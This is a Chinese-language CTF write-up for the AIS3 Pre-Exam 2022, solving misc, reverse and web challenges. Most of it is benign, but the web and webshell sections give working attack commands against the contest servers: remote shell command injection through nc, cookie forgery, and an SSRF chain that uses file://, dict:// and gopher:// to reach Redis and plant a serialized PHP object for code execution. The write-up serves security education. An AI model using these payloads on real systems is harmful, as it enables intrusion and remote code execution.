---
title: "AIS3 Pre Exam 2022 Writeup"
date: 2022-05-17T00:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup/tree/master/ais3-pre-exam-2022-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.png
description: ""
toc: 
---

# Score Board
![](https://img.stoneapp.tech/t510599/ais3-2022/pre-exam/scoreboard.jpeg)

## Welcome
### Welcome
#### 題目
![image](https://user-images.githubusercontent.com/57281249/168672745-6364d25f-e6b4-4251-a29b-7cc411ce8bfa.png)

![image](https://user-images.githubusercontent.com/57281249/168672792-4825a156-fd38-49e1-a414-b1dcba2e3d41.png)
#### Flag
`AIS3{WTF did I just see the FLAG before CTF starts?}`

## Misc
### Excel
#### 題目
![image](https://user-images.githubusercontent.com/57281249/168673095-490e4d69-2bf8-46b4-a8ce-468e4f4bf633.png)

#### 解題
![image](https://user-images.githubusercontent.com/57281249/168673322-8f21320d-a696-45ab-a92f-a616c09139e6.png)

![image](https://user-images.githubusercontent.com/57281249/168673375-2a2c9327-2e50-41cc-b0d2-63d1f2d4e95c.png)

![image](https://user-images.githubusercontent.com/57281249/168673443-93e61a32-9206-430b-8c06-e29a62838e1e.png)

![image](https://user-images.githubusercontent.com/57281249/168673507-f4504ec0-9a13-4b9b-8d45-99ccc72b137f.png)

#### Flag
`AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}`

### Gift in the dream
#### 題目
![image](https://user-images.githubusercontent.com/57281249/168673698-16d3c232-db1c-4d69-a3c0-9970b5503f32.png)

#### 解題
`binwalk gift_in_the_dream.gif` 一下發現啥都沒有。
![image](https://user-images.githubusercontent.com/57281249/168673798-46ea4b75-0057-40ed-84a7-8b8960af17c5.png)

`strings gift_in_the_dream.gif` 一下看到一堆重複出現的奇怪字串，應該是提示。
![image](https://user-images.githubusercontent.com/57281249/168673891-c278d846-63a4-4d04-9323-9f5107eaaf25.png)

通靈一下發現應該要用 identify 把每個幀數間的間距時間抓出來應該就是 flag 了。
![image](https://user-images.githubusercontent.com/57281249/168673950-126f0c6a-39d7-46ad-ac6d-00dc62b475fd.png)

#### Script

``` bash
#!/bin/bash

for a in $(identify -format "%s %T \n" gift_in_the_dream.gif | awk '{print $2}')
do
    printf "%02X" $a | xxd -r -p
done
```
![image](https://user-images.githubusercontent.com/57281249/168674150-9425fae5-e7af-4ab2-8de2-65af515d8752.png)

#### Flag
`AIS3{5T3gn0gR4pHy_c4N_b3_fUn_s0m37iMe}`

### Knock
#### 題目
![image](https://user-images.githubusercontent.com/57281249/168674246-cecba6af-39e8-43a6-97fe-0017f75890c3.png)

#### 解題
原本以為是 Web 題，後來想想又好像不對，request 抓出來改用 curl 跑。
`curl -X POST http://chals1.ais3.org:13337/ -d 'token=<token>'`
回傳的東西都是
`<p>I have knock on the <ip></p>`
於是馬上開 wireshark
![image](https://user-images.githubusercontent.com/57281249/168674437-9b199fe4-bb49-49e0-9cd3-8220e096b498.png)

果然，而且 dest port 明顯很像 ascii，應該接起來就 flag 了。

#### Script
##### iptables
``` bash
iptables -I INPUT 1 -i ais3pre2022 -p udp -s 10.113.203.111 -j LOG --log-prefix "FORAIS3"
```

##### rsyslog
```
if $msg contains "FORAIS3" then {
    ^<script path>
    stop
}
```

##### shell script
```
#!/bin/bash

splitinspace()
{
    for a in $(cat $1)
    do
        echo $a
    done
}

port=`echo $1 | splitinspace | grep DPT | cut -c 5- | sed 's/12//g'`

echo "$(cat /tmp/output)$(printf "%02X\n" $(python3 -c "print(int('$port'))") | xxd -r -p)" > /tmp/output
```

##### 執行結果
```
root@jimmyGW:~# curl -X POST http://chals1.ais3.org:13337/ -d 'token=<token>'
<p>I have knock on the <ip></p>
root@jimmyGW:~# vi /tmp/output
```
![image](https://user-images.githubusercontent.com/57281249/168674549-123dd8ae-46c0-4073-b4b2-d8d0d080bb79.png)

#### Flag
`AIS3{kn0ckKNOCKknock}`

### JeetQode
#### 題目
![image](https://user-images.githubusercontent.com/57281249/168675294-9bf6383f-02ff-4d65-ba3e-bb02aece6255.png)

#### 解題
這題就 judge 而已，只是要用 jq，老實說 jq 我一直都有再用，但用這麼深還是第一次。
到 [JQ 的 document](https://stedolan.github.io/jq/manual/) 找可以用的指令然後實現題目要求這樣而已(code 有點長因為沒規定長度所以沒特別壓)。

#### Code
1. `. == (explode | reverse | implode)`
2. `walk(if type == "object" then (setpath(["tmp"]; .left) | setpath(["left"]; .right) | setpath(["right"]; .tmp) | delpaths([["tmp"]])) else . end)`
3. `.body | walk(if type == "object" and (has("value") | not) then (if ([.op] | contains(["Add"])) then setpath(["value"]; (.left.value + .right.value)) else (if ([.op] | contains(["Sub"])) then setpath(["value"]; (.left.value - .right.value)) else (if ([.op] | contains(["Mult"])) then setpath(["value"]; (.left.value * .right.value)) else (if ([.op] | contains(["Div"])) then setpath(["value"]; (.left.value / .right.value)) else . end) end) end) end) else . end) | .value`

![image](https://user-images.githubusercontent.com/57281249/168675477-8291831f-8eef-4fe8-9d54-c206a2e0d4e4.png)

#### Flag
`AIS3{pr0gramm1ng_in_a_json_proce55in9_too1}`

### Seadog's Webshell
#### 題目
![image](https://user-images.githubusercontent.com/57281249/168675551-456344b7-b571-4a41-8150-e690d4daad11.png)

![image](https://user-images.githubusercontent.com/57281249/168675613-e4cab9ef-526e-44ee-be20-c55ed900b7ef.png)

#### Important Source Code
``` bash
#!/bin/sh

exec 2>/dev/null
base64 | timeout 10s sh

```

#### 解題
送進去的 code 必須同時符合 base64 的格式將其解碼送進去，因此 script 就用 `echo "//bin/ls" | base64 -d` 然後再 pipe 進 nc，並且用絕對路徑，這樣就可以用 `/` 填空位。
然而卻發現怎麼試都沒反應，因此用自己機器試了一下，發現 nc 沒送 eof，所以加了個 `-q 1`。
``` bash
echo "//bin/ls" | base64 -d | nc -q 1 chals1.ais3.org 12369
```

![image](https://user-images.githubusercontent.com/57281249/168675770-9f22fdf6-eae4-4747-8afe-e90b71ccc9f6.png)

成功

最後因為 flag 在 environment (根據 docker-ccompose.yml) 所以執行

``` bash
echo "/usr/bin/env" | base64 -d | nc -q 1 chals1.ais3.org 12369
```

![image](https://user-images.githubusercontent.com/57281249/168675828-91d4687e-ce81-4802-911d-45dc6a5c455c.png)

#### Flag
`AIS3{ZXNjYXBpbmdfYmFzZTY0X3dpdGhfZW9m}`

## Reverse
### Calculator
#### 題目
![image](https://user-images.githubusercontent.com/57281249/168676022-6f52e70e-e428-4ed4-af96-f86f10d78dc5.png)

#### 解題
dnspy 看 Extension.AIS3 到 AIS3333 這幾個 dll 然後按照 Operate method 內的規則將 Flag 一個字一個自填完。

![image](https://user-images.githubusercontent.com/57281249/168676149-2687d916-676c-42fc-9356-2597530d7c2d.png)

![image](https://user-images.githubusercontent.com/57281249/168676217-77abca3a-acad-402d-afb7-13b9d4128a40.png)

![image](https://user-images.githubusercontent.com/57281249/168676290-17a03d7b-bc30-41fe-a59a-b4fbf00b747f.png)

![image](https://user-images.githubusercontent.com/57281249/168676387-3a92151a-999f-4564-b60e-6b917ffb7abf.png)

#### Flag
`AIS3{D0T_N3T_FRAm3W0rk_15_S0_C0mPlicaT3d__G_G}`

### Strings
#### 題目
![image](https://user-images.githubusercontent.com/57281249/168676539-b52b4be4-cace-42f7-89b8-3e88fe25c4c8.png)

#### 解題
既然叫 strings 那就先 strings 一次

![image](https://user-images.githubusercontent.com/57281249/168676653-150a2672-4bb4-4bcc-90cc-e87ba30b2295.png)

噴出來的 flag 是假的，但也是提示

把阿姨開起來打開 String view 搜假 flag 點兩下到 IDA View 接著 `.data.rel.ro:000055CBACEDDDB0` 點兩下跳過去，然後再網上一點可以看到 `off_55CBACEDDDA0`(應該是變數名稱ㄅ) 點兩下 `strings::main::h34e687dfba9cc523` 就能直達主程式的地方

![image](https://user-images.githubusercontent.com/57281249/168676850-47fe0177-b77d-481c-b091-6def6c6b60f8.png)

![image](https://user-images.githubusercontent.com/57281249/168676909-3c464331-ab05-446d-9e61-1794a127c2f8.png)

![image](https://user-images.githubusercontent.com/57281249/168676966-ccfc3bb2-4cb5-4dbb-9831-e2fa57dddd4d.png)

![image](https://user-images.githubusercontent.com/57281249/168677209-3291d2fc-a304-4aac-9f5d-7225d8929211.png)

F5 反編譯然後開始跑 Debug

![image](https://user-images.githubusercontent.com/57281249/168677122-fa3f1c6f-b32e-4d8d-9cc0-42978091b2c9.png)

可以看到有一個 `core::str::_$LT$impl$u20$str$GT$::split` 這應該是 Rust 寫的，可以看到有一個 `"_"` 參數，應該是用 `"_"` 去拆分字串

![image](https://user-images.githubusercontent.com/57281249/168677345-1eaed10e-80e6-4aa7-91f2-bbb13ad0a256.png)

而後來在走到這邊時得到確認 `if ( alloc::vec::Vec$LT$T$C$A$GT$::len::hd32fa3309483c80e(v41) == 11 )` 代表 split 後的字串要有 11 個

![image](https://user-images.githubusercontent.com/57281249/168677418-25d50774-255d-4e7d-92fc-c25de01e02fc.png)

`if ( (core::cmp::impls::_$LT$impl$u20$core..cmp..PartialEq$LT$$RF$B$GT$$u20$for$u20$$RF$A$GT$::ne::h0948eadbdbca5c0e( v25, &(&off_55CBACEDDDA0)[2 * v21]) & 1) != 0 )`
這邊的話應該是  `v25 != &(&off_55CBACEDDDA0)[2 * v21]` 的話就算 `incorrect flag` 而 `v21` 則是從上面一個 `dest` array 來的

![image](https://user-images.githubusercontent.com/57281249/168677576-7b5264c9-81f0-4077-8df5-03fa0c17708d.png)

`dest` array 的內容是 `[0x0, 0x4, 0x10, 0xD, 0xA, 0x4, 0x8, 0x7, 0x1, 0x2, 0x12]` 換 10 進的話是 `[0, 4, 16, 13, 10, 4, 8, 7, 1, 2, 18]`

![image](https://user-images.githubusercontent.com/57281249/168678100-55920cd6-2e69-4f9e-8d1f-b1268b11d12a.png)

再找切分依據找了一陣子，最後有注意到 `if ( v21 >= 0x13 )` 符合的話會跑一個程式而且 Array 最後也是 18 而且剛好只有 11 個，我猜應該是最多只有 18 組。

![image](https://user-images.githubusercontent.com/57281249/168678269-458e7911-5b3d-48f6-8b62-5a7bd44b7c1e.png)

回到 `off_55CBACEDDDA0` 的 IDA View 時，又注意到它這邊有分 18 行，每行剛好就前進一個單字，除了第一個 "AIS3{" 跟最後一個 "}" 

![image](https://user-images.githubusercontent.com/57281249/168678438-91012e82-e331-43b6-8ba2-749c4d129a77.png)

於是我認為它的切分應該是長這樣 `AIS3{_good_luck_finding_the_flags_value_using_strings_command_guess_which_substring_is_our_actual_answer_lmaoo_}`

接著就簡單了，按照 dest 一個一個接回來送 ./strings 也回 correct flag 這樣就解掉了

![image](https://user-images.githubusercontent.com/57281249/168678617-90766d68-27c6-469b-8c6f-01fb14bba3dc.png)

#### Flag
`AIS3{_the_answer_is_guess_the_strings_using_good_luck_}`

## Web
### Poking Bear
#### 題目

![image](https://user-images.githubusercontent.com/57281249/168678736-f76ecd4f-cf71-4842-9ca6-839b26e546d8.png)

#### 解題
網頁內容是你可以選一隻 bear poke，但你要 poke 到 SECRET BEAR 才能拿到 Flag，但是 SECRET BEAR 的 bear id 他是隱藏的，然而第一隻到最後一隻的 id 是 5-999 那就用最原始的方式爆掃一波。

![image](https://user-images.githubusercontent.com/57281249/168678831-361e73c3-1421-4553-95f0-74fad6484303.png)

![image](https://user-images.githubusercontent.com/57281249/168678912-82276a1c-5dcd-452c-9c89-cc289145faa5.png)

![image](https://user-images.githubusercontent.com/57281249/168678942-0dade361-5815-4c8b-868a-db1a90d7d550.png)

``` bash
#!/bin/bash

> /tmp/output

for a in $(seq 1 1 1000)
do
    echo "$a: $(curl -X POST http://chals1.ais3.org:8987/poke -d "bear_id=$a")" >> /tmp/output &
done
```

![image](https://user-images.githubusercontent.com/57281249/168679172-e8275cf9-dde3-4a8c-93ad-d273d5f9edf4.png)

找與眾不同的那個 
``` bash
grep -v "You shouldn't poke a cat!" /tmp/output | grep -v "Poked, but nothing happened!"
```

![image](https://user-images.githubusercontent.com/57281249/168679215-cf3a67b0-3693-4872-a510-faff04ff99b2.png)

他說你不是 `bear poker` 八成要改 cookie。

``` bash
curl -X POST http://chals1.ais3.org:8987/poke --header "cookie: human=\"bear poker\"" -d "bear_id=499"
```

![image](https://user-images.githubusercontent.com/57281249/168679292-88af88d7-6247-4565-a814-babb679dc24c.png)

#### Flag
`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`

### Private Browsing
#### 題目

![image](https://user-images.githubusercontent.com/57281249/168679457-367f5a33-25db-4a3e-8f4e-244d8f1f7746.png)

#### 解題
看起來是很經典的 ssrf 雖說前端鎖定 `http[s]` 但後端沒鎖，所以直接用 `/api.php` 做 ssrf。

![image](https://user-images.githubusercontent.com/57281249/168679552-88a04987-7d50-483e-96ff-3c07959cb7ee.png)

先 `http://chals1.ais3.org:8763/api.php?action=view&url=file:///proc/net/tcp` 看有那些機器可以打。

![image](https://user-images.githubusercontent.com/57281249/168679688-0c967c35-cb63-431f-955d-16314138d99f.png)

可以看到 server 頻繁的對 `192.168.224.2:6379` 做存取

![image](https://user-images.githubusercontent.com/57281249/168679788-895144f3-7c15-491a-a442-9a722c921126.png)

google 查到 tcp 6379 port 是 redis

`http://chals1.ais3.org:8763/api.php?action=view&url=dict://192.168.224.2:6379/info` 證實了是 redis。

![image](https://user-images.githubusercontent.com/57281249/168679873-1df967d9-9962-4c41-99e1-9482f9ebd724.png)

但資訊依然不夠，因此抓 source code  `http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/api.php`

![image](https://user-images.githubusercontent.com/57281249/168679976-11321211-7ae7-4d26-81b0-c9f9d53d475e.png)

有一個 `require_once 'session.php'` 把他抓下來 `http://chals1.ais3.org:8763/api.php?action=view&url=file:///var/www/html/session.php`

![image](https://user-images.githubusercontent.com/57281249/168680029-3bd44063-68a1-47d3-8907-96a9e6adc53f.png)

經過長時間的閱讀後可以發現他會將 cookie `sess_id` 作為 key，現在所用的 `BrowsingSession` class serialize 後儲存到 redis 格式是長這樣 `O:15:"BrowsingSession":1:{s:7:"history";a:1:{i:0;s:19:"https://google.com/";}}` 這就是他做 history 的方式。

![image](https://user-images.githubusercontent.com/57281249/168680103-d9a97b08-e658-4fa6-8ffb-91ba0c8a9c97.png)

![image](https://user-images.githubusercontent.com/57281249/168680292-7ac1febd-13a0-48a6-b4ca-a9aead5ff853.png)

這樣的話就可以用這隻 script 建立 payload (dict 的話冒號會不見)
``` python
from urllib.parse import quote
import sys

tcp_payload = sys.argv[2]
ip = sys.argv[1]
url = f"gopher://{ip}:6379/_{quote(tcp_payload)}"
print(url)
```

但是 `BrowsingSession` 並沒有可以利用這點做 RCE 的地方，因為他只有一個 `history` 的 variable 並作為 array 做存取。

發現 `SessionManager` 的 `encode` 跟 `decode` 是 variable function 執行位置是在 `get()` 跟 `__destruct()`(解構子)

原本是著利用 `get()` 做 RCE 因為外層的 `SessionManager` 再跑 `$session->push` 會用 `__call()` return 的 class 去執行 `push` 
而 `get()` 的內容是 `val` 有東西就直接 return，redis 內有東西就直接 decode redis 的 value，都沒就建一個，而存在 redis 的東西被使用 `gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3BN%3Bs%3A6%3A%5C%22decode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 改成 `O:14:"SessionManager":3:{s:3:"val";N;s:6:"decode";s:6:"system";s:6:"sessid";s:4:"code";}`
所以他會跑內部的 `SessionManager` 的 `__call()` 然後 call `get()` 因為 `val` 是 null 所以會找 redis，因 redis 的 value 有用 `dict://192.168.224.2:6379/SET%20code%20%22ls%22` 設 `code` 為 `ls` 的 command 且 `decode` 被改成 `system` 所以會 RCE。

![image](https://user-images.githubusercontent.com/57281249/168680691-80edc434-15b8-452f-815a-b385a0cfe275.png)

![image](https://user-images.githubusercontent.com/57281249/168680802-cd723fc9-fa33-428e-9926-862e7438dc30.png)

然而忽略了一點是 `get()` 內的 redis 是 `$this` 下面的而非 `global` 而 connect 後的 redis 無法用 `unserialize` 製造，所以用 `get()` RCE 會是失敗的。

![image](https://user-images.githubusercontent.com/57281249/168680978-db80ee91-3815-4818-b47d-df422484bcb4.png)

後來想到如果成是 error 內部的 `SessionManager` 也會做 `__destruct()` 因此用 `gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3Bs%3A2%3A%5C%22ls%5C%22%3Bs%3A6%3A%5C%22encode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 將其設為 `O:14:"SessionManager":3:{s:3:"val";s:2:"ls";s:6:"encode";s:6:"system";s:6:"sessid";s:4:"code";}` 

![image](https://user-images.githubusercontent.com/57281249/168681047-d59c3bac-65ee-43ae-a00c-e00e616549f1.png)

然後將 cookie 切為 `fc57bda95a5184e55555` 然後隨便看一個 url 可以發現成功 RCE。

![image](https://user-images.githubusercontent.com/57281249/168681126-6a23d53c-493c-49c6-96fe-7edfe8cd9145.png)

用`gopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3Bs%3A9%3A%5C%22/readflag%5C%22%3Bs%3A6%3A%5C%22encode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22` 將其設為 `O:14:"SessionManager":3:{s:3:"val";s:9:"/readflag";s:6:"encode";s:6:"system";s:6:"sessid";s:4:"code";}` 

![image](https://user-images.githubusercontent.com/57281249/168681275-3db45eb8-68a1-466d-bd64-dc5569362920.png)

然後將 cookie 切為 `fc57bda95a5184e55555` 便可以看到 flag。

![image](https://user-images.githubusercontent.com/57281249/168681316-972fd3c8-472d-461f-add3-a50a971d0dc0.png)

#### Flag
`AIS3{deadly_ssrf_to_rce}`
